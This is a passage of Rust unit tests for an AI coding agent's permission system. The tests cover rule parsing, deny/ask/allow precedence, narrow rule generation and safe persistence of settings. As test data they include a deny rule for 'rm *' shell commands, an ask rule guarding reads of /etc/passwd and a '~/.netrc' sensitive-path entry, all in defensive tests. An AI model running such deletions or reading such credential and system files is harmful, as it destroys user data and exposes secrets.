    use std::path::PathBuf;

    // ===================================================================
    // Task 1 tests — path accessors, loading, soft failures, preservation
    // ===================================================================

    /// Load a project's settings with **no** global layer.
    ///
    /// `PermissionSettings::load` also reads `$HOME/.tact/settings.json`, which
    /// makes every rule-count assertion here depend on the machine running the
    /// test. That dependency is not hypothetical: inside the `bwrap` sandbox
    /// (`HOME=/workspace`) the global path resolves to
    /// `<workdir>/.tact/settings.json` — the repository's own project settings —
    /// so four of these tests failed on a workspace that had one. `load_from` is
    /// the documented injection point for exactly this, so the tests below use it
    /// and assert only on what they wrote.
    fn load_project_only(project_dir: &std::path::Path) -> PermissionSettings {
        PermissionSettings::load_from(&project_dir.join(".tact/settings.json"), None)
    }

    // ——— Path accessor tests ——————————————————————————————

    #[test]
    fn settings_path_uses_project_tact_directory() {
        let path = TactPath::new("/work/project");
        assert_eq!(
            path.settings_path(),
            PathBuf::from("/work/project/.tact/settings.json")
        );
    }

    #[test]
    fn home_settings_path_uses_home_tact_directory() {
        // TactPath::home_settings_path reads $HOME; we test the path derivation
        // by checking that the method returns Some(...) and the suffix is correct
        // when HOME is set.
        if let Some(p) = TactPath::home_settings_path() {
            assert!(p.ends_with(".tact/settings.json"));
        }
    }

    // ——— Missing-file / soft-failure tests —————————————————

    #[test]
    fn missing_settings_are_empty() {
        let dir = tempfile::tempdir().unwrap();
        let settings = load_project_only(dir.path());
        assert!(settings.rules().is_empty());
    }

    #[test]
    fn missing_settings_have_empty_project_doc() {
        let dir = tempfile::tempdir().unwrap();
        let settings = load_project_only(dir.path());
        assert_eq!(settings.project_doc(), &Value::Object(Map::new()));
        assert_eq!(settings.allow_rules().len(), 0);
        assert_eq!(settings.ask_rules().len(), 0);
        assert_eq!(settings.deny_rules().len(), 0);
    }

    #[test]
    fn malformed_json_is_soft_failure() {
        let dir = tempfile::tempdir().unwrap();
        let project_file = dir.path().join(".tact/settings.json");
        std::fs::create_dir_all(dir.path().join(".tact")).unwrap();
        std::fs::write(&project_file, "not valid json").unwrap();

        let settings = load_project_only(dir.path());
        assert!(settings.rules().is_empty());
    }

    #[test]
    fn valid_project_file_loads_rules() {
        let dir = tempfile::tempdir().unwrap();
        let project_file = dir.path().join(".tact/settings.json");
        std::fs::create_dir_all(dir.path().join(".tact")).unwrap();
        std::fs::write(
            &project_file,
            r#"{
                "permissions": {
                    "allow": ["read_file", "bash(command:cargo *)"],
                    "ask": ["edit_file"]
                },
                "custom_field": "value"
            }"#,
        )
        .unwrap();

        let settings = load_project_only(dir.path());
        assert_eq!(settings.allow_rules().len(), 2);
        assert_eq!(settings.ask_rules().len(), 1);
        assert_eq!(settings.deny_rules().len(), 0);
        assert_eq!(settings.rules().len(), 3);
        // Unknown fields are preserved
        assert_eq!(
            settings
                .project_doc()
                .get("custom_field")
                .and_then(|v| v.as_str()),
            Some("value")
        );
    }

    // ——— Injected-path test (avoids mutating $HOME) ———————

    #[test]
    fn load_from_injected_paths() {
        let dir = tempfile::tempdir().unwrap();

        // Project settings
        let project_dir = dir.path().join("proj");
        std::fs::create_dir_all(project_dir.join(".tact")).unwrap();
        std::fs::write(
            project_dir.join(".tact/settings.json"),
            r#"{"permissions": {"allow": ["edit_file(path:src/*)"]}}"#,
        )
        .unwrap();

        // Global settings
        let global_dir = dir.path().join("global_home");
        std::fs::create_dir_all(global_dir.join(".tact")).unwrap();
        std::fs::write(
            global_dir.join(".tact/settings.json"),
            r#"{"permissions": {"allow": ["read_file"]}}"#,
        )
        .unwrap();

        let settings = PermissionSettings::load_from(
            &project_dir.join(".tact/settings.json"),
            Some(&global_dir.join(".tact/settings.json")),
        );

        // Both layers merged
        assert_eq!(settings.allow_rules().len(), 2);
        assert!(settings.allow_rules().contains(&"read_file".to_string()));
        assert!(
            settings
                .allow_rules()
                .contains(&"edit_file(path:src/*)".to_string())
        );
    }

    #[test]
    fn load_from_missing_global_path() {
        let dir = tempfile::tempdir().unwrap();
        let project_dir = dir.path().join("proj");
        std::fs::create_dir_all(project_dir.join(".tact")).unwrap();
        std::fs::write(
            project_dir.join(".tact/settings.json"),
            r#"{"permissions": {"allow": ["bash"]}}"#,
        )
        .unwrap();

        // No global path
        let settings =
            PermissionSettings::load_from(&project_dir.join(".tact/settings.json"), None);

        assert_eq!(settings.allow_rules().len(), 1);
        assert!(settings.allow_rules().contains(&"bash".to_string()));
    }

    // ——— Unknown-field preservation ——————————————————

    #[test]
    fn unknown_fields_are_retained_in_project_doc() {
        let dir = tempfile::tempdir().unwrap();
        let project_file = dir.path().join(".tact/settings.json");
        std::fs::create_dir_all(dir.path().join(".tact")).unwrap();
        std::fs::write(
            &project_file,
            r#"{
                "version": 2,
                "permissions": {
                    "deny": ["bash(command:rm *)"],
                    "extra_unknown": "keep me"
                },
                "top_level_extra": "also keep me"
            }"#,
        )
        .unwrap();

        let settings = load_project_only(dir.path());
        assert_eq!(settings.deny_rules().len(), 1);
        // Top-level unknown
        assert_eq!(
            settings
                .project_doc()
                .get("top_level_extra")
                .and_then(|v| v.as_str()),
            Some("also keep me")
        );
        // Unknown inside permissions
        assert_eq!(
            settings
                .project_doc()
                .get("permissions")
                .and_then(|v| v.get("extra_unknown"))
                .and_then(|v| v.as_str()),
            Some("keep me")
        );
    }

    // ===================================================================
    // Task 2 tests — rule parsing, matching, precedence, generation
    // ===================================================================

    // ——— Bare rule parsing —————————————————————

    #[test]
    fn bare_tool_rule_matches_any_input() {
        let rule = PermissionRule::parse("read_file").unwrap();
        assert!(matches!(rule, PermissionRule::Bare { .. }));
        assert_eq!(rule.tool_name(), "read_file");

        // Matches the tool regardless of input.
        assert!(rule.matches("read_file", &serde_json::json!({"path": "a"})));
        assert!(rule.matches("read_file", &serde_json::json!({"command": "ls"})));
        assert!(rule.matches("read_file", &serde_json::json!({})));

        // Does not match other tools.
        assert!(!rule.matches("write_file", &serde_json::json!({"path": "a"})));
        assert!(!rule.matches("bash", &serde_json::json!({"command": "ls"})));
    }

    #[test]
    fn bare_rule_with_tool_only() {
        let rule = PermissionRule::parse("bash").unwrap();
        assert!(matches!(rule, PermissionRule::Bare { ref tool } if tool == "bash"));
        assert!(rule.matches("bash", &serde_json::json!({"command": "anything"})));
        assert!(!rule.matches("read_file", &serde_json::json!({})));
    }

    #[test]
    fn empty_string_is_none() {
        assert!(PermissionRule::parse("").is_none());
        assert!(PermissionRule::parse("   ").is_none());
    }

    // ——— Argument rule parsing —————————————————

    #[test]
    fn argument_rule_uses_glob_matching() {
        let rule = PermissionRule::parse("bash(command:cargo test *)").unwrap();
        assert!(matches!(rule, PermissionRule::Argument { .. }));

        // Should match commands like "cargo test -p tact"
        assert!(rule.matches(
            "bash",
            &serde_json::json!({"command": "cargo test -p tact"})
        ));
        assert!(rule.matches("bash", &serde_json::json!({"command": "cargo test --doc"})));

        // Should not match non-matching commands
        assert!(!rule.matches("bash", &serde_json::json!({"command": "git push"})));
        assert!(!rule.matches("bash", &serde_json::json!({"command": "cargo build"})));

        // Should not match other tools
        assert!(!rule.matches("read_file", &serde_json::json!({"command": "cargo test"})));
    }

    #[test]
    fn argument_rule_requires_string_field() {
        let rule = PermissionRule::parse("edit_file(path:src/lib.rs)").unwrap();

        // String field matches
        assert!(rule.matches("edit_file", &serde_json::json!({"path": "src/lib.rs"})));

        // Non-string field does not match
        assert!(!rule.matches("edit_file", &serde_json::json!({"path": 42})));
        assert!(!rule.matches("edit_file", &serde_json::json!({"path": null})));

        // Missing field does not match
        assert!(!rule.matches("edit_file", &serde_json::json!({"other": "src/lib.rs"})));
        assert!(!rule.matches("edit_file", &serde_json::json!({})));
    }

    #[test]
    fn argument_rule_parses_field_and_pattern() {
        let rule = PermissionRule::parse("bash(command:echo hello)").unwrap();
        if let PermissionRule::Argument {
            tool,
            field,
            pattern,
            ..
        } = &rule
        {
            assert_eq!(tool, "bash");
            assert_eq!(field, "command");
            assert_eq!(pattern, "echo hello");
        } else {
            panic!("Expected Argument variant");
        }
    }

    // ——— Malformed syntax —————————————————

    #[test]
    fn malformed_syntax_returns_none() {
        // Missing closing paren
        assert!(PermissionRule::parse("bash(command:").is_none());

        // Missing colon inside parens
        assert!(PermissionRule::parse("bash(command)").is_none());

        // Empty field
        assert!(PermissionRule::parse("bash(:pattern)").is_none());

        // Empty pattern
        assert!(PermissionRule::parse("bash(field:)").is_none());

        // Empty tool name with parens
        assert!(PermissionRule::parse("(field:pattern)").is_none());

        // Nested parens
        assert!(PermissionRule::parse("bash(field:())").is_none());

        // Lone closing paren
        assert!(PermissionRule::parse("bash)").is_none());
    }

    #[test]
    fn invalid_pattern_is_non_matching() {
        // A glob pattern with invalid syntax (e.g. bare `[`) should parse
        // as an Argument rule with matcher = None, so it never matches.
        let rule = PermissionRule::parse("bash(command:[invalid)").unwrap();
        assert!(matches!(rule, PermissionRule::Argument { .. }));

        // Should not match anything (invalid pattern → non-matching).
        assert!(!rule.matches("bash", &serde_json::json!({"command": "[invalid"})));
        assert!(!rule.matches("bash", &serde_json::json!({"command": "anything"})));
    }

    // ——— Wildcards in patterns —————————————————

    #[test]
    fn glob_wildcard_matches_arbitrary_text() {
        let rule = PermissionRule::parse("bash(command:cargo test *)").unwrap();

        // `*` matches any suffix
        assert!(rule.matches(
            "bash",
            &serde_json::json!({"command": "cargo test -p tact --lib"})
        ));
        assert!(rule.matches(
            "bash",
            &serde_json::json!({"command": "cargo test -- --nocapture"})
        ));

        // `*` does not match empty prefix (but `*` matches anything)
        assert!(!rule.matches("bash", &serde_json::json!({"command": "cargo build"})));
    }

    #[test]
    fn glob_star_star_matches_arbitrary_text() {
        let rule = PermissionRule::parse("read_file(path:**/src/**)").unwrap();

        assert!(rule.matches(
            "read_file",
            &serde_json::json!({"path": "/home/user/src/lib.rs"})
        ));
        assert!(rule.matches(
            "read_file",
            &serde_json::json!({"path": "project/src/main.rs"})
        ));
        assert!(!rule.matches(
            "read_file",
            &serde_json::json!({"path": "/home/user/docs/readme.md"})
        ));
    }

    #[test]
    fn exact_pattern_matches_literally() {
        let rule = PermissionRule::parse("edit_file(path:src/lib.rs)").unwrap();

        assert!(rule.matches("edit_file", &serde_json::json!({"path": "src/lib.rs"})));
        assert!(!rule.matches("edit_file", &serde_json::json!({"path": "src/lib.rsx"})));
        assert!(!rule.matches("edit_file", &serde_json::json!({"path": "SRC/lib.rs"}))); // case-sensitive
    }

    // ——— Precedence —————————————————

    #[test]
    fn deny_beats_ask_and_allow() {
        let policy = EffectiveRules::from_lists(
            &["bash(command:cargo *)".to_string()],            // allow
            &["bash(command:cargo test *)".to_string()],       // ask
            &["bash(command:cargo test --doc *)".to_string()], // deny
        );

        // The call matches all three; deny wins.
        assert_eq!(
            policy.action(
                "bash",
                &serde_json::json!({"command": "cargo test --doc foobar"})
            ),
            RuleAction::Deny
        );

        // Matches allow and ask but not deny → ask wins.
        assert_eq!(
            policy.action(
                "bash",
                &serde_json::json!({"command": "cargo test -p tact"})
            ),
            RuleAction::Ask
        );

        // Matches only allow → allow.
        assert_eq!(
            policy.action("bash", &serde_json::json!({"command": "cargo build"})),
            RuleAction::Allow
        );

        // No match → None.
        assert_eq!(
            policy.action("bash", &serde_json::json!({"command": "ls"})),
            RuleAction::None
        );
    }

    #[test]
    fn ask_beats_allow() {
        let policy = EffectiveRules::from_lists(
            &["read_file".to_string()],                   // allow
            &["read_file(path:/etc/passwd)".to_string()], // ask
            &[] as &[String],                             // deny empty
        );

        assert_eq!(
            policy.action("read_file", &serde_json::json!({"path": "/etc/passwd"})),
            RuleAction::Ask
        );

        // Non-matching ask → allow wins.
        assert_eq!(
            policy.action("read_file", &serde_json::json!({"path": "/home/user/foo"})),
            RuleAction::Allow
        );
    }

    #[test]
    fn deny_independent_of_array_order() {
        // deny listed first
        let policy1 = EffectiveRules::from_lists(
            &["bash(command:allow *)".to_string()],
            &[] as &[String],
            &["bash(command:deny *)".to_string()],
        );
        // deny listed last
        let policy2 = EffectiveRules::from_lists(
            &["bash(command:allow *)".to_string()],
            &[] as &[String],
            &["bash(command:deny *)".to_string()],
        );

        // Both match the same deny rule
        assert_eq!(
            policy1.action("bash", &serde_json::json!({"command": "deny something"})),
            RuleAction::Deny
        );
        assert_eq!(
            policy2.action("bash", &serde_json::json!({"command": "deny something"})),
            RuleAction::Deny
        );
    }

    // ——— EffectiveRules construction —————————————————

    #[test]
    fn effective_rules_skips_invalid_rules() {
        let policy = EffectiveRules::from_lists(
            &["valid_bare".to_string(), "malformed(".to_string()],
            &[] as &[String],
            &[] as &[String],
        );

        // Only the valid rule should be present.
        assert_eq!(policy.allow.len(), 1);
        assert!(policy.allow[0].matches("valid_bare", &Value::Object(Map::new())));
    }

    // ——— Rule generation —————————————————

    #[test]
    fn generate_command_rule_uses_named_field() {
        let rule = PermissionRule::generate(
            "bash",
            PermissionPromptPolicy::Command { field: "command" },
            &serde_json::json!({"command": "cargo test"}),
        )
        .unwrap();

        assert!(matches!(rule, PermissionRule::Argument { .. }));
        assert_eq!(rule.tool_name(), "bash");
        assert_eq!(rule.to_rule_string(), "bash(command:cargo test)");
    }

    #[test]
    fn generate_path_rule_uses_named_field() {
        let rule = PermissionRule::generate(
            "edit_file",
            PermissionPromptPolicy::Path { field: "path" },
            &serde_json::json!({"path": "src/main.rs"}),
        )
        .unwrap();

        assert!(matches!(rule, PermissionRule::Argument { .. }));
        assert_eq!(rule.to_rule_string(), "edit_file(path:src/main.rs)");
    }

    #[test]
    fn generate_question_rule_uses_named_field() {
        let rule = PermissionRule::generate(
            "ask_user",
            PermissionPromptPolicy::Question { field: "question" },
            &serde_json::json!({"question": "What is your name?"}),
        )
        .unwrap();

        assert!(matches!(rule, PermissionRule::Argument { .. }));
        assert_eq!(
            rule.to_rule_string(),
            "ask_user(question:What is your name?)"
        );
    }

    #[test]
    fn generate_json_rule_is_bare() {
        let rule = PermissionRule::generate(
            "compact",
            PermissionPromptPolicy::Json,
            &serde_json::json!({"some_field": "value"}),
        )
        .unwrap();

        assert!(matches!(rule, PermissionRule::Bare { .. }));
        assert_eq!(rule.to_rule_string(), "compact");
    }

    /// A missing or non-string field means no argument-aware rule is
    /// expressible. The old behaviour — a bare, tool-wide rule — granted more
    /// than the prompt the user answered, so it is now `None`.
    #[test]
    fn generate_refuses_when_the_field_is_missing_or_not_a_string() {
        assert!(
            PermissionRule::generate(
                "bash",
                PermissionPromptPolicy::Command { field: "command" },
                &serde_json::json!({"not_command": "value"}),
            )
            .is_none()
        );
        assert!(
            PermissionRule::generate(
                "bash",
                PermissionPromptPolicy::Command { field: "command" },
                &serde_json::json!({"command": 42}),
            )
            .is_none()
        );
    }

    /// The regression this whole change exists for: `git commit -m "fix: x"`
    /// contains a `:`, and used to persist a bare `bash` rule — permission for
    /// every future shell command.
    #[test]
    fn generate_refuses_a_value_containing_a_rule_delimiter() {
        for command in ["echo (hello)", "echo )", "git commit -m \"fix: thing\""] {
            let rule = PermissionRule::generate(
                "bash",
                PermissionPromptPolicy::Command { field: "command" },
                &serde_json::json!({ "command": command }),
            );
            assert!(
                rule.is_none(),
                "a delimiter in {command:?} must not degrade to a tool-wide rule: {rule:?}"
            );
        }
    }

    #[test]
    fn generate_preserves_exact_value_as_pattern() {
        let rule = PermissionRule::generate(
            "bash",
            PermissionPromptPolicy::Command { field: "command" },
            &serde_json::json!({"command": "cargo test -- --nocapture"}),
        )
        .unwrap();

        assert_eq!(
            rule.to_rule_string(),
            "bash(command:cargo test -- --nocapture)"
        );
    }

    #[test]
    fn generate_preserves_existing_wildcard() {
        let rule = PermissionRule::generate(
            "bash",
            PermissionPromptPolicy::Command { field: "command" },
            &serde_json::json!({"command": "cargo test *"}),
        )
        .unwrap();

        assert_eq!(rule.to_rule_string(), "bash(command:cargo test *)");
    }

    /// `apply_patch` used to declare a prompt field its input does not have,
    /// so "Always allow this tool" persisted a bare `apply_patch` rule: one
    /// click permitted every future patch, to any file.
    #[test]
    fn generate_patch_rule_is_keyed_on_the_single_target() {
        let rule = PermissionRule::generate(
            "apply_patch",
            PermissionPromptPolicy::PatchTarget {
                patch_field: "patch",
            },
            &serde_json::json!({
                "patch": "--- a/notes.md\n+++ b/notes.md\n@@ -1 +1 @@\n-old\n+new\n"
            }),
        )
        .unwrap();

        assert_eq!(rule.to_rule_string(), "apply_patch(patch:*notes.md*)");
        assert!(!matches!(rule, PermissionRule::Bare { .. }));
    }

    /// A multi-file patch keyed on one of its paths would silently authorise
    /// the others too, so it is not narrowable at all.
    #[test]
    fn generate_refuses_a_multi_file_patch() {
        let rule = PermissionRule::generate(
            "apply_patch",
            PermissionPromptPolicy::PatchTarget {
                patch_field: "patch",
            },
            &serde_json::json!({
                "patch": "+++ b/a.rs\n+++ b/b.rs\n"
            }),
        );
        assert!(rule.is_none());
    }

    #[test]
    fn generate_refuses_a_patch_with_no_parseable_target() {
        let rule = PermissionRule::generate(
            "apply_patch",
            PermissionPromptPolicy::PatchTarget {
                patch_field: "patch",
            },
            &serde_json::json!({ "patch": "not a diff" }),
        );
        assert!(rule.is_none());
    }

    // ——— Round-trip parse + to_string —————————————————

    #[test]
    fn bare_rule_round_trip() {
        let s = "read_file";
        let rule = PermissionRule::parse(s).unwrap();
        assert_eq!(rule.to_rule_string(), s);
    }

    #[test]
    fn argument_rule_round_trip() {
        let s = "bash(command:cargo test *)";
        let rule = PermissionRule::parse(s).unwrap();
        assert_eq!(rule.to_rule_string(), s);
    }

    #[test]
    fn generated_rule_is_parseable() {
        let rule = PermissionRule::generate(
            "bash",
            PermissionPromptPolicy::Command { field: "command" },
            &serde_json::json!({"command": "cargo test"}),
        )
        .unwrap();
        let s = rule.to_rule_string();

        // Re-parse and verify it still matches.
        let reparsed = PermissionRule::parse(&s).unwrap();
        assert!(reparsed.matches("bash", &serde_json::json!({"command": "cargo test"})));
        assert!(!reparsed.matches("bash", &serde_json::json!({"command": "cargo build"})));
    }

    // ===================================================================
    // Task 3 tests — scope merging, persistence, atomic writes
    // ===================================================================

    // ——— Global + project merge ————————————————

    #[test]
    fn project_rules_are_merged_after_global_rules() {
        let dir = tempfile::tempdir().unwrap();

        // Global settings: allow "bash"
        let global_dir = dir.path().join("global_home");
        std::fs::create_dir_all(global_dir.join(".tact")).unwrap();
        std::fs::write(
            global_dir.join(".tact/settings.json"),
            r#"{"permissions": {"allow": ["bash"]}}"#,
        )
        .unwrap();

        // Project settings: deny "bash"
        let project_dir = dir.path().join("proj");
        std::fs::create_dir_all(project_dir.join(".tact")).unwrap();
        std::fs::write(
            project_dir.join(".tact/settings.json"),
            r#"{"permissions": {"deny": ["bash"]}}"#,
        )
        .unwrap();

        let settings = PermissionSettings::load_from(
            &project_dir.join(".tact/settings.json"),
            Some(&global_dir.join(".tact/settings.json")),
        );

        // Effective policy includes both global allow and project deny.
        assert!(settings.allow_rules().contains(&"bash".to_string()));
        assert!(settings.deny_rules().contains(&"bash".to_string()));

        // At match time, deny wins over allow.
        let effective = EffectiveRules::from_lists(
            settings.allow_rules(),
            settings.ask_rules(),
            settings.deny_rules(),
        );
        assert_eq!(
            effective.action("bash", &serde_json::json!({"command": "anything"})),
            RuleAction::Deny
        );
    }

    /// `load` is now a thin delegate to `load_from`; this pins the precedence it
    /// passes through, so the collapse cannot silently reorder the layers.
    ///
    /// The implemented contract is: **global rules first, then project rules,
    /// unioned with dedup**. There is no per-layer override — a project `allow`
    /// does not cancel a global `deny`. Precedence is decided at match time
    /// (`deny > ask > allow`), which is why rule *order* is not what protects
    /// the user.
    #[test]
    fn load_from_unions_global_then_project_deduplicating() {
        let dir = tempfile::tempdir().unwrap();

        std::fs::write(
            dir.path().join("global.json"),
            r#"{"permissions": {"allow": ["read_file", "bash"], "deny": ["write_file"]}}"#,
        )
        .unwrap();
        std::fs::write(
            dir.path().join("project.json"),
            r#"{"permissions": {"allow": ["bash", "edit_file"], "ask": ["write_file"]}}"#,
        )
        .unwrap();

        let settings = PermissionSettings::load_from(
            &dir.path().join("project.json"),
            Some(&dir.path().join("global.json")),
        );

        assert_eq!(
            settings.allow_rules(),
            &[
                "read_file".to_string(),
                "bash".to_string(),
                "edit_file".to_string()
            ],
            "global rules first, project rules appended, duplicates dropped"
        );
        assert_eq!(settings.deny_rules(), &["write_file".to_string()]);
        assert_eq!(settings.ask_rules(), &["write_file".to_string()]);

        // Layer order does not cancel the union: both a global deny and a
        // project ask for the same tool survive, and deny wins at match time.
        let effective = EffectiveRules::from_lists(
            settings.allow_rules(),
            settings.ask_rules(),
            settings.deny_rules(),
        );
        assert_eq!(
            effective.action("write_file", &serde_json::json!({"path": "x"})),
            RuleAction::Deny
        );
    }

    // ——— Persistence: rule addition with deduplication and preservation ————

    #[test]
    fn adding_rule_preserves_unknown_fields_and_deduplicates() {
        let dir = tempfile::tempdir().unwrap();

        let project_file = dir.path().join(".tact/settings.json");
        std::fs::create_dir_all(dir.path().join(".tact")).unwrap();
        std::fs::write(
            &project_file,
            r#"{
                "version": 1,
                "permissions": {
                    "allow": ["read_file"],
                    "unknown_perm_field": "keep"
                },
                "top_extra": "keep"
            }"#,
        )
        .unwrap();
        let mut settings = PermissionSettings::load_from(&project_file, None);

        // Add a new rule
        settings
            .persist_project_allow("bash(command:cargo test *)")
            .unwrap();

        // Verify the file content preserves unknown fields
        let content = std::fs::read_to_string(&project_file).unwrap();
        let doc: Value = serde_json::from_str(&content).unwrap();

        // Top-level unknown preserved
        assert_eq!(doc.get("top_extra").and_then(|v| v.as_str()), Some("keep"));
        // Unknown inside permissions preserved
        assert_eq!(
            doc.pointer("/permissions/unknown_perm_field")
                .and_then(|v| v.as_str()),
            Some("keep")
        );
        // Version preserved
        assert_eq!(doc.get("version").and_then(|v| v.as_i64()), Some(1));

        // Allow array should contain both the original and the new rule
        let allow = doc
            .pointer("/permissions/allow")
            .and_then(|v| v.as_array())
            .unwrap();
        assert_eq!(allow.len(), 2);

        // Deduplication: adding the same rule again should not duplicate
        settings
            .persist_project_allow("bash(command:cargo test *)")
            .unwrap();
        let content2 = std::fs::read_to_string(&project_file).unwrap();
        let doc2: Value = serde_json::from_str(&content2).unwrap();
        let allow2 = doc2
            .pointer("/permissions/allow")
            .and_then(|v| v.as_array())
            .unwrap();
        assert_eq!(allow2.len(), 2, "Duplicate rule should not be added again");
    }

    /// The security sections ride in the same document, so persisting an allow
    /// rule must not drop them — a "Always allow this tool" click would
    /// otherwise silently re-enable the guard the user had configured.
    #[test]
    fn adding_rule_preserves_the_security_sections() {
        let dir = tempfile::tempdir().unwrap();
        let project_file = dir.path().join(".tact/settings.json");
        std::fs::create_dir_all(dir.path().join(".tact")).unwrap();
        std::fs::write(
            &project_file,
            r#"{
                "permissions": {
                    "allow": [],
                    "sensitive_paths": { "allow": ["~/.netrc"] },
                    "redaction": { "level": "credential" }
                }
            }"#,
        )
        .unwrap();

        let mut settings = PermissionSettings::load_from(&project_file, None);
        assert_eq!(
            settings.security_config().sensitive_paths.allow,
            vec!["~/.netrc"]
        );
        assert_eq!(
            settings.security_config().redaction.resolved_level(),
            crate::security::RedactionLevel::Credential
        );

        settings.persist_project_allow("read_file(.env)").unwrap();

        let content = std::fs::read_to_string(&project_file).unwrap();
        let doc: Value = serde_json::from_str(&content).unwrap();
        assert_eq!(
            doc.pointer("/permissions/sensitive_paths/allow/0")
                .and_then(|v| v.as_str()),
            Some("~/.netrc")
        );
        assert_eq!(
            doc.pointer("/permissions/redaction/level")
                .and_then(|v| v.as_str()),
            Some("credential")
        );
    }

    // ——— Persistence creates directory and pretty JSON ———————————

    #[test]
    fn persist_creates_project_directory_and_pretty_json() {
        let dir = tempfile::tempdir().unwrap();

        // No .tact directory exists yet.
        let project_file = dir.path().join("proj/.tact/settings.json");
        assert!(!project_file.parent().unwrap().exists());

        let mut settings = PermissionSettings::load_from(&project_file, None);

        settings.persist_project_allow("read_file").unwrap();

        // Directory should have been created
        assert!(project_file.parent().unwrap().exists());
        assert!(project_file.exists());

        // Content should be pretty-printed JSON with trailing newline
        let content = std::fs::read_to_string(&project_file).unwrap();
        assert!(content.ends_with('\n'), "Trailing newline required");

        // Parse and verify the rule is present
        let doc: Value = serde_json::from_str(&content).unwrap();
        let allow = doc
            .pointer("/permissions/allow")
            .and_then(|v| v.as_array())
            .unwrap();
        assert_eq!(allow.len(), 1);
        assert_eq!(allow[0].as_str(), Some("read_file"));

        // Verify it's pretty-printed (has indentation)
        assert!(
            content.contains("  \"permissions\""),
            "Expected pretty-printed JSON with indentation"
        );
    }

    // ——— Persistence creates permissions/allow from empty doc ———————

    #[test]
    fn persist_creates_permissions_and_allow_from_scratch() {
        let dir = tempfile::tempdir().unwrap();
        let project_file = dir.path().join(".tact/settings.json");

        let mut settings = PermissionSettings::load_from(&project_file, None);
        // Document starts as {}
        settings.persist_project_allow("bash(command:ls)").unwrap();

        let content = std::fs::read_to_string(&project_file).unwrap();
        let doc: Value = serde_json::from_str(&content).unwrap();

        // permissions.allow array should exist with the rule
        let allow = doc
            .pointer("/permissions/allow")
            .and_then(|v| v.as_array())
            .unwrap();
        assert_eq!(allow.len(), 1);
        assert_eq!(allow[0].as_str(), Some("bash(command:ls)"));
    }

    // ——— Malformed layer is soft failure —————————————————

    #[test]
    fn malformed_layer_is_soft_failure() {
        let dir = tempfile::tempdir().unwrap();

        // Global settings: valid allow rule
        let global_dir = dir.path().join("global_home");
        std::fs::create_dir_all(global_dir.join(".tact")).unwrap();
        std::fs::write(
            global_dir.join(".tact/settings.json"),
            r#"{"permissions": {"allow": ["read_file"]}}"#,
        )
        .unwrap();

        // Project settings: malformed JSON
        let project_dir = dir.path().join("proj");
        std::fs::create_dir_all(project_dir.join(".tact")).unwrap();
        std::fs::write(
            project_dir.join(".tact/settings.json"),
            "not valid json at all",
        )
        .unwrap();

        let settings = PermissionSettings::load_from(
            &project_dir.join(".tact/settings.json"),
            Some(&global_dir.join(".tact/settings.json")),
        );

        // The valid global rule should still apply despite the malformed project file.
        assert!(
            settings.allow_rules().contains(&"read_file".to_string()),
            "Global allow rule should be present even when project file is malformed"
        );

        // Effective action should allow read_file
        let effective = EffectiveRules::from_lists(
            settings.allow_rules(),
            settings.ask_rules(),
            settings.deny_rules(),
        );
        assert_eq!(
            effective.action("read_file", &serde_json::json!({})),
            RuleAction::Allow
        );
    }

    // ——— Persistence error does not cause denial ———————————

    #[test]
    fn persist_error_is_returned_not_converted_to_denial() {
        // Use a path that cannot be written to (e.g., a file system root
        // without permissions). We check that the error type is PersistError,
        // not a permission denial.
        let bad_path = PathBuf::from("/no-permissions-dir/.tact/settings.json");

        let mut settings = PermissionSettings::load_from(&bad_path, None);

        let result = settings.persist_project_allow("read_file");

        match result {
            Err(e) => {
                // Error must be PersistError, not a permission denial.
                let msg = format!("{}", e);
                assert!(
                    msg.contains("I/O error") || msg.contains("Failed to create directory"),
                    "Expected I/O-related PersistError, got: {}",
                    msg
                );
            }
            Ok(()) => {
                // On some systems (e.g., running as root), the write might
                // succeed — that's acceptable too.
            }
        }
    }

    // ——— Persistence writes atomic temp file ———————————————————

    #[test]
    fn persist_writes_atomically_via_temp_file() {
        let dir = tempfile::tempdir().unwrap();
        let project_file = dir.path().join(".tact/settings.json");

        let mut settings = PermissionSettings::load_from(&project_file, None);

        settings.persist_project_allow("read_file").unwrap();

        // The target file exists
        assert!(project_file.exists());

        // There should be no leftover .tmp files in the same directory
        let parent = project_file.parent().unwrap();
        let entries: Vec<_> = std::fs::read_dir(parent)
            .unwrap()
            .map(|e| e.unwrap().file_name())
            .collect();
        for entry in &entries {
            let s = entry.to_string_lossy();
            assert!(
                !s.contains(".tmp"),
                "Unexpected temp file leftover: {:?}",
                entry
            );
        }
    }

    // ——— Replace incompatible field types ———————————————————

    #[test]
    fn persist_replaces_incompatible_known_field_types() {
        let dir = tempfile::tempdir().unwrap();
        let project_file = dir.path().join(".tact/settings.json");
        std::fs::create_dir_all(dir.path().join(".tact")).unwrap();

        // Write a document where `permissions` is a string (incompatible type)
        std::fs::write(
            &project_file,
            r#"{"permissions": "should be an object", "keep_me": "intact"}"#,
        )
        .unwrap();

        let mut settings = PermissionSettings::load_from(&project_file, None);
        settings.persist_project_allow("bash").unwrap();

        let content = std::fs::read_to_string(&project_file).unwrap();
        let doc: Value = serde_json::from_str(&content).unwrap();

        // Unknown top-level field preserved
        assert_eq!(doc.get("keep_me").and_then(|v| v.as_str()), Some("intact"));
        // permissions now an object with allow array
        let allow = doc
            .pointer("/permissions/allow")
            .and_then(|v| v.as_array())
            .unwrap();
        assert_eq!(allow.len(), 1);
        assert_eq!(allow[0].as_str(), Some("bash"));
    }

    // ——— Persist updates the in-memory allow_rules —————————————

    #[test]
    fn persist_updates_in_memory_rules() {
        let dir = tempfile::tempdir().unwrap();
        let project_file = dir.path().join(".tact/settings.json");

        let mut settings = PermissionSettings::load_from(&project_file, None);
        assert_eq!(settings.allow_rules().len(), 0);

        settings.persist_project_allow("read_file").unwrap();

        // The in-memory allow_rules should also be updated
        assert!(settings.allow_rules().contains(&"read_file".to_string()));
    }

    // --- Regression: failure does not mutate in-memory state, retry works ---

    /// Force a persistence failure by making the target directory read-only,
    /// then restore writability and verify that a retry actually writes the
    /// rule (rather than silently deduplicating in memory).
    #[test]
    #[cfg_attr(not(unix), ignore = "requires Unix file permissions (chmod)")]
    fn persist_failure_does_not_mutate_in_memory_and_retry_succeeds() {
        use std::os::unix::fs::PermissionsExt;

        let dir = tempfile::tempdir().unwrap();
        let project_file = dir.path().join(".tact/settings.json");

        // Pre-create the .tact directory.
        std::fs::create_dir_all(project_file.parent().unwrap()).unwrap();

        let mut settings = PermissionSettings::load_from(&project_file, None);

        // Make the directory read-only to force a write failure.
        let parent = project_file.parent().unwrap();
        std::fs::set_permissions(parent, std::fs::Permissions::from_mode(0o555)).unwrap();

